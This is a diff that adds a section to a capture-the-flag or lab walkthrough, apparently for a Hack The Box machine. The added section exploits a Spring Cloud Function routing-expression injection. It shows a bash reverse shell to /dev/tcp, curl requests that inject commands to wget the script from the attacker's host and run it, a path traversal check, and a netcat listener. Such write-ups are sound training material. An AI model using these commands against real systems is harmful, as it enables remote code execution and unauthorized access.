@@ -218,6 +218,75 @@ Now, lets go ahead and check if the file is already in our ```/tmp``` directory
 
 cool, this means our exploit worked
 
+Now, lets go ahead and upload our reverse shell to the ```/tmp``` directory. We'll be using a bash script
+
+```
+#!/bin/bash
+
+bash -i >& /dev/tcp/192.168.49.64/1234 0>&1
+```
+Save that to a .sh file, and ensure you change the $IP and $port_number
+
+```
+┌──(bl4ck4non㉿bl4ck4non)-[~/Documents/short notes]
+└─$ nano bash.sh
+                                                                                                                                                                                                                                
+┌──(bl4ck4non㉿bl4ck4non)-[~/Documents/short notes]
+└─$ cat bash.sh
+#!/bin/bash
+
+bash -i >& /dev/tcp/10.10.15.62/1234 0>&1
+```
+Now, lets upload
+
+>command: curl -X POST  http://10.129.178.179:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("wget http://10.10.15.62/bash.sh -O /tmp/bash.sh")' --data-raw 'data' -v
+
+Ensure you host the .sh file from your machine
+
+>command: python3 -m http.server
+
+![image](https://user-images.githubusercontent.com/67879936/224531207-c1155af5-656b-4bb8-a50b-6f50412b387e.png)
+
+cool, now lets run the command
+
+![image](https://user-images.githubusercontent.com/67879936/224531216-31b561ca-ea54-40ab-862a-c7629ad9b924.png)
+
+checking the ```/tmp``` directory
+
+>command: curl -s http://10.129.178.179:8080/show_image?img=../../../../../../../../../../tmp
+
+![image](https://user-images.githubusercontent.com/67879936/224531254-31d89cb6-1104-48f2-ae7c-fd5cab3df089.png)
+
+cool hehe, to run this we'll be using the ```bash``` command
+
+>command: curl -X POST  http://10.129.178.179:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /tmp/bash.sh")' --data-raw 'data' -v
+
+Ensure you have your netcat listener running before running the above command
+
+>command: rlwrap nc -nvlp 1234
+
+![image](https://user-images.githubusercontent.com/67879936/224531384-a054d9c6-0152-46b7-8a29-c5e59b0e2b6b.png)
+
+on our netcat listener;
+
+![image](https://user-images.githubusercontent.com/67879936/224531429-32fc69b9-0b3d-457f-ab69-3803f27d61b3.png)
+
+cool, we got a user shell as Frank. Lets go ahead and escalate our privileges.
+
+
+
+<h2>Privilege Escalation</h2>
+
+
+
+
+
+
+
+
+
+
+
 
 
 
